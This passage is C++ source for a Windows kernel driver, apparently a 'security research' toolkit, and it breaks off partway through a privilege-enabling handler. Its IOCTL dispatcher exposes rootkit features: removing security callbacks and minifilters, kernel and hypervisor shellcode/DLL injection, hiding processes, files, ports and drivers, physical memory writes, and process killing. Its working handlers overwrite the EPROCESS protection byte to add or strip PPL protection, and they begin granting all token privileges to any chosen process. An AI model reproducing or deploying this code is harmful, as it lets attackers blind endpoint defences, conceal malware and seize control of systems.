#include "pch.h"
#include "DioProcessGlobals.h"
#include "Locker.h"
#include "Hypervisor/HvProtection.h"
#include "../Injection/EarlyInjection.h"
#include "../Injection/ManualMap.h"
#include "../FileHide/FileHide.h"
#include "../DKOM/ProcessHide.h"
#include "../Memory/PhysicalMemory.h"
#include "../NSI/PortHide.h"
#include "../EptHook/UsermodeEptHook.h"
#include "../EptHook/RegisterChange.h"
#include "../Memory/HideMemory.h"
#include "../ProcessKill/ProcessKill.h"
#include "../WFP/WfpCapture.h"

// Forward declaration for HandleCopyMemory
NTSTATUS HandleCopyMemory(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);

// Forward declaration for VM region enumeration
NTSTATUS HandleEnumVmRegions(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);

// Forward declarations for EPT Hook handlers
NTSTATUS HandleEptHookInstall(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);
NTSTATUS HandleEptHookInstallDetour(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);
NTSTATUS HandleEptHookRemove(PIRP Irp, PIO_STACK_LOCATION irpSp);
NTSTATUS HandleEptHookList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);

// Forward declarations for Register Change handlers
NTSTATUS HandleRegChangeInstall(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);
NTSTATUS HandleRegChangeRemove(PIRP Irp, PIO_STACK_LOCATION irpSp);
NTSTATUS HandleRegChangeList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);
NTSTATUS HandleRegChangeRemoveAll(PIRP Irp, PIO_STACK_LOCATION irpSp);

// Forward declaration for HideMemory handler
NTSTATUS HandleHideMemory(PIRP Irp, PIO_STACK_LOCATION irpSp);

// Forward declaration for Kernel Manual Map handler
NTSTATUS HandleKernelManualMap(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);

// Forward declarations for Packet Capture handlers
NTSTATUS HandlePacketStartCapture(PIRP Irp, PIO_STACK_LOCATION irpSp);
NTSTATUS HandlePacketStopCapture(PIRP Irp, PIO_STACK_LOCATION irpSp);
NTSTATUS HandlePacketGetPackets(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);
NTSTATUS HandlePacketInject(PIRP Irp, PIO_STACK_LOCATION irpSp);
NTSTATUS HandlePacketAddFilter(PIRP Irp, PIO_STACK_LOCATION irpSp);
NTSTATUS HandlePacketRemoveFilter(PIRP Irp, PIO_STACK_LOCATION irpSp);
NTSTATUS HandlePacketClearFilters(PIRP Irp, PIO_STACK_LOCATION irpSp);
NTSTATUS HandlePacketClearBuffer(PIRP Irp, PIO_STACK_LOCATION irpSp);
NTSTATUS HandlePacketGetState(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);

// ============== IOCTL Device Control Dispatcher ==============

NTSTATUS DioProcessDeviceControl(PDEVICE_OBJECT, PIRP Irp)
{
	auto irpSp = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	ULONG_PTR info = 0;

	switch (irpSp->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_DIOPROCESS_REGISTER_CALLBACKS:
		status = HandleRegisterCallbacks(Irp);
		break;

	case IOCTL_DIOPROCESS_UNREGISTER_CALLBACKS:
		status = HandleUnregisterCallbacks(Irp);
		break;

	case IOCTL_DIOPROCESS_START_COLLECTION:
		status = HandleStartCollection(Irp);
		break;

	case IOCTL_DIOPROCESS_STOP_COLLECTION:
		status = HandleStopCollection(Irp);
		break;

	case IOCTL_DIOPROCESS_GET_COLLECTION_STATE:
		status = HandleGetCollectionState(Irp, &info);
		break;

	// Security Research IOCTLs
	case IOCTL_DIOPROCESS_PROTECT_PROCESS:
		status = HandleProtectProcess(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_UNPROTECT_PROCESS:
		status = HandleUnprotectProcess(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_ENABLE_PRIVILEGES:
		status = HandleEnablePrivileges(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_CLEAR_DEBUG_FLAGS:
		status = HandleClearDebugFlags(Irp, irpSp);
		break;

	// Callback Enumeration IOCTLs
	case IOCTL_DIOPROCESS_ENUM_PROCESS_CALLBACKS:
		status = HandleEnumProcessCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_THREAD_CALLBACKS:
		status = HandleEnumThreadCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_IMAGE_CALLBACKS:
		status = HandleEnumImageCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_OBJECT_CALLBACKS:
		status = HandleEnumObjectCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_MINIFILTERS:
		status = HandleEnumMinifilters(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_UNLINK_MINIFILTER:
		status = HandleUnlinkMinifilter(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_ENUM_DRIVERS:
		status = HandleEnumDrivers(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_PSPCIDTABLE:
		status = HandleEnumPspCidTable(Irp, irpSp, &info);
		break;

	// Callback Removal IOCTLs
	case IOCTL_DIOPROCESS_REMOVE_PROCESS_CALLBACK:
		status = HandleRemoveProcessCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_REMOVE_THREAD_CALLBACK:
		status = HandleRemoveThreadCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_REMOVE_IMAGE_CALLBACK:
		status = HandleRemoveImageCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_REMOVE_OBJECT_CALLBACK:
		status = HandleRemoveObjectCallback(Irp, irpSp);
		break;

	// Registry Callback IOCTLs (RCK style)
	case IOCTL_DIOPROCESS_ENUM_REGISTRY_CALLBACKS:
		status = HandleEnumRegistryCallbacks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_REMOVE_REGISTRY_CALLBACK:
		status = HandleRemoveRegistryCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_SET_REGISTRY_CALLBACK_OFFSETS:
		status = HandleSetRegistryCallbackOffsets(Irp, irpSp);
		break;

	// Callback Restore IOCTLs
	case IOCTL_DIOPROCESS_RESTORE_PROCESS_CALLBACK:
		status = HandleRestoreProcessCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESTORE_THREAD_CALLBACK:
		status = HandleRestoreThreadCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESTORE_IMAGE_CALLBACK:
		status = HandleRestoreImageCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESTORE_OBJECT_CALLBACK:
		status = HandleRestoreObjectCallback(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESTORE_REGISTRY_CALLBACK:
		status = HandleRestoreRegistryCallback(Irp, irpSp);
		break;

	// Kernel Injection IOCTLs
	case IOCTL_DIOPROCESS_KERNEL_INJECT_SHELLCODE:
		status = HandleKernelInjectShellcode(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_KERNEL_INJECT_DLL:
		status = HandleKernelInjectDll(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_KERNEL_MANUAL_MAP:
		status = HandleKernelManualMap(Irp, irpSp, &info);
		break;

	// Hypervisor Control IOCTLs
	case IOCTL_DIOPROCESS_HV_START:
		status = HandleHvStart(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_STOP:
		status = HandleHvStop(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_PING:
		status = HandleHvPing(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_INSTALL_HOOKS:
		status = HandleHvInstallHooks(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_REMOVE_HOOKS:
		status = HandleHvRemoveHooks(Irp, irpSp, &info);
		break;

	// Hypervisor Process Protection IOCTLs
	case IOCTL_DIOPROCESS_HV_PROTECT_PROCESS:
		status = HandleHvProtectProcess(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_UNPROTECT_PROCESS:
		status = HandleHvUnprotectProcess(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_IS_PROCESS_PROTECTED:
		status = HandleHvIsProcessProtected(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_LIST_PROTECTED:
		status = HandleHvListProtected(Irp, irpSp, &info);
		break;

	// Hypervisor Driver Hiding IOCTLs
	case IOCTL_DIOPROCESS_HV_HIDE_DRIVER:
		status = HandleHvHideDriver(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_UNHIDE_DRIVER:
		status = HandleHvUnhideDriver(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_IS_DRIVER_HIDDEN:
		status = HandleHvIsDriverHidden(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_REMOVE_HIDDEN_DRIVER:
		status = HandleHvRemoveHiddenDriver(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_CLEAR_HIDDEN_DRIVERS:
		status = HandleHvClearHiddenDrivers(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_LIST_HIDDEN_DRIVERS:
		status = HandleHvListHiddenDrivers(Irp, irpSp, &info);
		break;

	// Ring -1 Injection IOCTLs
	case IOCTL_DIOPROCESS_HV_INJECT_SHELLCODE:
		status = HandleHvInjectShellcode(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_INJECT_DLL:
		status = HandleHvInjectDll(Irp, irpSp, &info);
		break;

	// Ring -1 Memory Read/Write IOCTLs (HV Scanner)
	case IOCTL_DIOPROCESS_HV_READ_VM:
		status = HandleHvReadVm(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_WRITE_VM:
		status = HandleHvWriteVm(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_HV_ALLOC_WRITE_NEAR:
		status = HandleHvAllocWriteNear(Irp, irpSp, &info);
		break;

	// Early Injection IOCTLs
	case IOCTL_DIOPROCESS_EARLY_INJECT_ARM:
		status = HandleEarlyInjectArm(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_EARLY_INJECT_DISARM:
		status = HandleEarlyInjectDisarm(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_EARLY_INJECT_STATUS:
		status = HandleEarlyInjectStatus(Irp, irpSp, &info);
		break;

	// Kernel Memory Copy IOCTL (KsDumper-style)
	case IOCTL_DIOPROCESS_COPY_MEMORY:
		status = HandleCopyMemory(Irp, irpSp, &info);
		break;

	// File Hiding IOCTLs (Minifilter)
	case IOCTL_DIOPROCESS_FILEHIDE_HIDE:
		status = HandleFileHideHide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_FILEHIDE_UNHIDE:
		status = HandleFileHideUnhide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_FILEHIDE_LIST:
		status = HandleFileHideList(Irp, irpSp, &info);
		break;

	// DKOM Process Hiding IOCTLs
	case IOCTL_DIOPROCESS_PROCESS_HIDE:
		status = HandleProcessHide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PROCESS_UNHIDE:
		status = HandleProcessUnhide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PROCESS_HIDE_LIST:
		status = HandleProcessHideList(Irp, irpSp, &info);
		break;

	// Physical Memory IOCTLs
	case IOCTL_DIOPROCESS_TRANSLATE_VA:
		status = HandleTranslateVA(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_READ_PHYSICAL:
		status = HandleReadPhysical(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_WRITE_PHYSICAL:
		status = HandleWritePhysical(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_PHYS_READ_VM:
		status = HandlePhysReadVm(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_ENUM_VM_REGIONS:
		status = HandleEnumVmRegions(Irp, irpSp, &info);
		break;

	// NSI Port Hiding IOCTLs
	case IOCTL_DIOPROCESS_PORT_HIDE:
		status = HandlePortHide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PORT_UNHIDE:
		status = HandlePortUnhide(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PORT_HIDE_LIST:
		status = HandlePortHideList(Irp, irpSp, &info);
		break;

	// Usermode EPT Hook IOCTLs
	case IOCTL_DIOPROCESS_EPT_HOOK_INSTALL:
		status = HandleEptHookInstall(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_EPT_HOOK_REMOVE:
		status = HandleEptHookRemove(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_EPT_HOOK_LIST:
		status = HandleEptHookList(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_EPT_HOOK_INSTALL_DETOUR:
		status = HandleEptHookInstallDetour(Irp, irpSp, &info);
		break;

	// EPT Register Change IOCTLs
	case IOCTL_DIOPROCESS_REG_CHANGE_INSTALL:
		status = HandleRegChangeInstall(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_REG_CHANGE_REMOVE:
		status = HandleRegChangeRemove(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_REG_CHANGE_LIST:
		status = HandleRegChangeList(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_REG_CHANGE_REMOVE_ALL:
		status = HandleRegChangeRemoveAll(Irp, irpSp);
		break;

	// Memory Protection Hiding
	case IOCTL_DIOPROCESS_HIDE_MEMORY:
		status = HandleHideMemory(Irp, irpSp);
		break;

	// Process Kill IOCTLs
	case IOCTL_DIOPROCESS_KILL_TERMINATE:
		status = HandleKillTerminate(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_KILL_UNMAP:
		status = HandleKillUnmap(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_KILL_PEB_CORRUPT:
		status = HandleKillPebCorrupt(Irp, irpSp);
		break;

	// Packet Capture IOCTLs (WFP)
	case IOCTL_DIOPROCESS_PACKET_START_CAPTURE:
		status = HandlePacketStartCapture(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PACKET_STOP_CAPTURE:
		status = HandlePacketStopCapture(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PACKET_GET_PACKETS:
		status = HandlePacketGetPackets(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_PACKET_INJECT:
		status = HandlePacketInject(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PACKET_ADD_FILTER:
		status = HandlePacketAddFilter(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PACKET_REMOVE_FILTER:
		status = HandlePacketRemoveFilter(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PACKET_CLEAR_FILTERS:
		status = HandlePacketClearFilters(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PACKET_CLEAR_BUFFER:
		status = HandlePacketClearBuffer(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_PACKET_GET_STATE:
		status = HandlePacketGetState(Irp, irpSp, &info);
		break;

	// Kernel Process/Thread Control IOCTLs
	case IOCTL_DIOPROCESS_SUSPEND_PROCESS:
		status = HandleSuspendProcess(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESUME_PROCESS:
		status = HandleResumeProcess(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_SUSPEND_THREAD:
		status = HandleSuspendThread(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_RESUME_THREAD:
		status = HandleResumeThread(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_TERMINATE_THREAD:
		status = HandleTerminateThread(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_ENUM_SYSTEM_THREADS:
		status = HandleEnumSystemThreads(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_SET_ETHREAD_OFFSETS:
		status = HandleSetEthreadOffsets(Irp, irpSp);
		break;

	case IOCTL_DIOPROCESS_ENUM_ALL_KERNEL_THREADS:
		status = HandleEnumAllKernelThreads(Irp, irpSp, &info);
		break;

	case IOCTL_DIOPROCESS_SET_THREAD_API_ADDRESSES:
		status = HandleSetThreadApiAddresses(Irp, irpSp);
		break;

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	return CompleteRequest(Irp, status, info);
}

// ============== Collection Control Handlers ==============

NTSTATUS HandleRegisterCallbacks(PIRP Irp)
{
	UNREFERENCED_PARAMETER(Irp);

	if (g_CallbacksRegistered)
	{
		KdPrint((DRIVER_PREFIX "Callbacks already registered\n"));
		return STATUS_ALREADY_REGISTERED;
	}

	NTSTATUS status;

	// Register process callback
	status = PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, FALSE);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to register process callback (0x%X)\n", status));
		return status;
	}
	KdPrint((DRIVER_PREFIX "Process callback registered\n"));

	// Register thread callback
	status = PsSetCreateThreadNotifyRoutine(OnThreadCallback);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to register thread callback (0x%X)\n", status));
		PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, TRUE);
		return status;
	}
	KdPrint((DRIVER_PREFIX "Thread callback registered\n"));

	// Register image load callback
	status = PsSetLoadImageNotifyRoutine(OnImageLoadCallback);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to register image load callback (0x%X)\n", status));
		PsRemoveCreateThreadNotifyRoutine(OnThreadCallback);
		PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, TRUE);
		return status;
	}
	KdPrint((DRIVER_PREFIX "Image load callback registered\n"));

	// Register Object Manager callbacks
	OB_CALLBACK_REGISTRATION obCallbackReg = { 0 };
	OB_OPERATION_REGISTRATION obOpReg[2] = { 0 };

	obOpReg[0].ObjectType = PsProcessType;
	obOpReg[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
	obOpReg[0].PreOperation = OnPreProcessHandleOperation;
	obOpReg[0].PostOperation = nullptr;

	obOpReg[1].ObjectType = PsThreadType;
	obOpReg[1].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
	obOpReg[1].PreOperation = OnPreThreadHandleOperation;
	obOpReg[1].PostOperation = nullptr;

	UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"321000");
	obCallbackReg.Version = OB_FLT_REGISTRATION_VERSION;
	obCallbackReg.OperationRegistrationCount = 2;
	obCallbackReg.Altitude = altitude;
	obCallbackReg.RegistrationContext = nullptr;
	obCallbackReg.OperationRegistration = obOpReg;

	status = ObRegisterCallbacks(&obCallbackReg, &g_ObCallbackHandle);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to register OB callbacks (0x%X)\n", status));
		// Continue without OB callbacks
		status = STATUS_SUCCESS;
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Object Manager callbacks registered\n"));
	}

	// Register registry callback
	UNICODE_STRING regAltitude = RTL_CONSTANT_STRING(L"321001");
	PDRIVER_OBJECT driverObj = IoGetCurrentIrpStackLocation(Irp)->DeviceObject->DriverObject;
	NTSTATUS regStatus = CmRegisterCallbackEx(OnRegistryCallback, &regAltitude, driverObj, nullptr, &g_RegistryCookie, nullptr);
	if (!NT_SUCCESS(regStatus))
	{
		KdPrint((DRIVER_PREFIX "Failed to register registry callback (0x%X)\n", regStatus));
		// Continue without registry callbacks
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Registry callback registered\n"));
	}

	g_CallbacksRegistered = TRUE;
	KdPrint((DRIVER_PREFIX "All callbacks registered successfully\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleUnregisterCallbacks(PIRP Irp)
{
	UNREFERENCED_PARAMETER(Irp);

	if (!g_CallbacksRegistered)
	{
		KdPrint((DRIVER_PREFIX "Callbacks not registered\n"));
		return STATUS_SUCCESS;
	}

	// Unregister in reverse order
	if (g_RegistryCookie.QuadPart != 0)
	{
		CmUnRegisterCallback(g_RegistryCookie);
		g_RegistryCookie.QuadPart = 0;
		KdPrint((DRIVER_PREFIX "Registry callback unregistered\n"));
	}

	if (g_ObCallbackHandle)
	{
		ObUnRegisterCallbacks(g_ObCallbackHandle);
		g_ObCallbackHandle = nullptr;
		KdPrint((DRIVER_PREFIX "Object Manager callbacks unregistered\n"));
	}

	PsRemoveLoadImageNotifyRoutine(OnImageLoadCallback);
	KdPrint((DRIVER_PREFIX "Image load callback unregistered\n"));

	PsRemoveCreateThreadNotifyRoutine(OnThreadCallback);
	KdPrint((DRIVER_PREFIX "Thread callback unregistered\n"));

	PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, TRUE);
	KdPrint((DRIVER_PREFIX "Process callback unregistered\n"));

	g_CallbacksRegistered = FALSE;
	g_State.CollectionEnabled = FALSE;
	KdPrint((DRIVER_PREFIX "All callbacks unregistered\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleStartCollection(PIRP Irp)
{
	UNREFERENCED_PARAMETER(Irp);
	g_State.CollectionEnabled = TRUE;
	KdPrint((DRIVER_PREFIX "Collection started\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleStopCollection(PIRP Irp)
{
	UNREFERENCED_PARAMETER(Irp);
	g_State.CollectionEnabled = FALSE;
	KdPrint((DRIVER_PREFIX "Collection stopped\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleGetCollectionState(PIRP Irp, PULONG_PTR info)
{
	auto irpSp = IoGetCurrentIrpStackLocation(Irp);
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(CollectionStateResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (CollectionStateResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	response->IsCollecting = g_State.CollectionEnabled;
	response->ItemCount = g_State.ItemCount;
	*info = sizeof(CollectionStateResponse);
	return STATUS_SUCCESS;
}

// ============== Security Research Handlers ==============

// Helper function to get signature levels for a protection level
static void GetSignatureLevelsForProtection(ProcessProtectionLevel level, UCHAR* sigLevel, UCHAR* sectionSigLevel)
{
	// Default values
	*sigLevel = 0;
	*sectionSigLevel = 0;

	switch (level)
	{
	case PS_PROTECTED_SYSTEM:
		*sigLevel = 0x3F;          // SE_SIGNING_LEVEL_WINDOWS_TCB (highest)
		*sectionSigLevel = 0x3F;
		break;
	case PS_PROTECTED_WINTCB:
		*sigLevel = 0x3E;          // SE_SIGNING_LEVEL_WINDOWS_TCB
		*sectionSigLevel = 0x3E;
		break;
	case PS_PROTECTED_WINDOWS:
		*sigLevel = 0x3C;          // SE_SIGNING_LEVEL_WINDOWS
		*sectionSigLevel = 0x3C;
		break;
	case PS_PROTECTED_AUTHENTICODE:
		*sigLevel = 0x08;          // SE_SIGNING_LEVEL_AUTHENTICODE
		*sectionSigLevel = 0x08;
		break;
	case PS_PROTECTED_WINTCB_LIGHT:
		*sigLevel = 0x3E;          // SE_SIGNING_LEVEL_WINDOWS_TCB
		*sectionSigLevel = 0x3C;   // SE_SIGNING_LEVEL_WINDOWS
		break;
	case PS_PROTECTED_WINDOWS_LIGHT:
		*sigLevel = 0x3C;          // SE_SIGNING_LEVEL_WINDOWS
		*sectionSigLevel = 0x3C;
		break;
	case PS_PROTECTED_LSA_LIGHT:
		*sigLevel = 0x18;          // SE_SIGNING_LEVEL_MICROSOFT
		*sectionSigLevel = 0x18;
		break;
	case PS_PROTECTED_ANTIMALWARE_LIGHT:
		*sigLevel = 0x18;          // SE_SIGNING_LEVEL_ANTIMALWARE
		*sectionSigLevel = 0x18;
		break;
	case PS_PROTECTED_AUTHENTICODE_LIGHT:
		*sigLevel = 0x08;          // SE_SIGNING_LEVEL_AUTHENTICODE
		*sectionSigLevel = 0x08;
		break;
	default:
		break;
	}
}

NTSTATUS HandleProtectProcess(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for process protection\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	
	// Support both old (TargetProcessRequest) and new (ProtectProcessWithLevelRequest) formats
	ProcessProtectionLevel level = PS_PROTECTED_WINTCB_LIGHT;  // Default level
	ULONG processId = 0;

	if (inputLen >= sizeof(ProtectProcessWithLevelRequest))
	{
		// New format with protection level
		auto request = (ProtectProcessWithLevelRequest*)Irp->AssociatedIrp.SystemBuffer;
		if (!request)
		{
			return STATUS_INVALID_PARAMETER;
		}
		processId = request->ProcessId;
		level = request->Level;
	}
	else if (inputLen >= sizeof(TargetProcessRequest))
	{
		// Old format - use default level
		auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
		if (!request)
		{
			return STATUS_INVALID_PARAMETER;
		}
		processId = request->ProcessId;
	}
	else
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	// Get EPROCESS
	PEPROCESS eProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)processId, &eProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
			processId, status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Protecting process PID %d with level 0x%02X (EPROCESS=0x%p, Offset=0x%X)\n",
		processId, level, eProcess, PROCESS_PROTECTION_OFFSET[windowsVersion]));

	// Get pointer to Protection byte directly (PPLmanager approach)
	ULONG_PTR protectionAddr = (ULONG_PTR)eProcess + PROCESS_PROTECTION_OFFSET[windowsVersion];
	UCHAR* pProtectionByte = (UCHAR*)protectionAddr;

	// Read current protection value for logging
	KdPrint((DRIVER_PREFIX "Current Protection byte: 0x%02X\n", *pProtectionByte));

	// Write protection level directly (PPLmanager approach - just 1 byte)
	*pProtectionByte = (UCHAR)level;

	KdPrint((DRIVER_PREFIX "New Protection byte: 0x%02X\n", *pProtectionByte));

	ObDereferenceObject(eProcess);
	KdPrint((DRIVER_PREFIX "Process PID %d protected successfully with level 0x%02X\n", processId, level));
	return STATUS_SUCCESS;
}

NTSTATUS HandleUnprotectProcess(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for process unprotection\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Get EPROCESS
	PEPROCESS eProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
			request->ProcessId, status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Removing protection from process PID %d\n", request->ProcessId));

	// Get pointer to Protection byte directly (PPLmanager approach)
	ULONG_PTR protectionAddr = (ULONG_PTR)eProcess + PROCESS_PROTECTION_OFFSET[windowsVersion];
	UCHAR* pProtectionByte = (UCHAR*)protectionAddr;

	// Zero out protection (just 1 byte)
	*pProtectionByte = 0;

	ObDereferenceObject(eProcess);
	KdPrint((DRIVER_PREFIX "Process PID %d unprotected successfully\n", request->ProcessId));
	return STATUS_SUCCESS;
}

NTSTATUS HandleEnablePrivileges(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for privilege manipulation\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Get EPROCESS
	PEPROCESS eProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
			request->ProcessId, status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Enabling all privileges for process PID %d\n", request->ProcessId));

	// Get primary token
	PACCESS_TOKEN pToken = PsReferencePrimaryToken(eProcess);
	if (!pToken)
	{
		ObDereferenceObject(eProcess);
		KdPrint((DRIVER_PREFIX "PsReferencePrimaryToken failed\n"));
		return STATUS_UNSUCCESSFUL;
	}

	// Get privileges structure pointer
	PPROCESS_PRIVILEGES tokenPrivs =
